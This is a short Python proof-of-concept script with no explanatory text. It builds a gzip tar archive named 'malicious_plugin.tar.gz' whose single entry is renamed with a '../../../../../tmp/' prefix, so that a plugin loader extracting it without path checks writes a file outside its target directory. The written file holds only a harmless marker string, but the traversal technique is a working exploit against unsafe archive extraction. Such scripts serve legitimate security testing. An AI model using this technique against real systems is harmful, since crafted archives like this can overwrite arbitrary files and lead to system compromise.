import tarfile

def change_name(tarinfo):
    tarinfo.name = "../../../../../tmp/" + tarinfo.name
    return tarinfo

with tarfile.open("malicious_plugin.tar.gz", "w:gz") as tar:
    with open("hacked", "w") as f:
        f.write("This is a malicious file.")
    tar.add("hacked", filter=change_name)